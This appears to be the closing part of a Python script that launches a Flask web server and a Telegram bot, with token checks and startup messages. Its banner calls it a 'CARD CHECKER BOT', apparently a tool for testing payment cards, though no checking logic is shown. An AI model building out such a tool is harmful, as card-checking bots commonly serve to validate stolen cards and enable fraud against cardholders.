    app.run(host='0.0.0.0', port=port)

def run_telegram_bot():
    """Run Telegram bot with error handling"""
    if not BOT_TOKEN:
        print("❌ Cannot start bot: No BOT_TOKEN provided")
        return
    
    print(f"🤖 Starting Telegram bot...")
    try:
        bot_info = bot.get_me()
        print(f"✅ Bot connected: @{bot_info.username}")
        print("📱 Bot is now running and listening for commands...")
        bot.infinity_polling()
    except Exception as e:
        print(f"❌ Bot error: {str(e)}")

# ===== MAIN FUNCTION =====
def main():
    """Main entry point"""
    print("=" * 60)
    print("🚀 CARD CHECKER BOT STARTING...")
    print("=" * 60)
    
    # Check for token
    if not BOT_TOKEN:
        print("❌ ERROR: TELEGRAM_BOT_TOKEN not found!")
        print("💡 Set it as environment variable:")
        print("   On Render: Environment → Add Environment Variable")
        print("   Locally: export TELEGRAM_BOT_TOKEN='your-token'")
        print("=" * 60)
        # Still start web server for health checks
        run_flask_server()
        return
    
    # Start both services in separate threads
    try:
        # Start Flask server in background thread
        flask_thread = threading.Thread(target=run_flask_server, daemon=True)
        flask_thread.start()
        
        # Give Flask a moment to start
        time.sleep(2)
        
        # Start Telegram bot in main thread
        run_telegram_bot()
        
    except KeyboardInterrupt:
        print("\n👋 Shutting down...")
    except Exception as e:
        print(f"❌ Main error: {str(e)}")

if __name__ == "__main__":
    main()
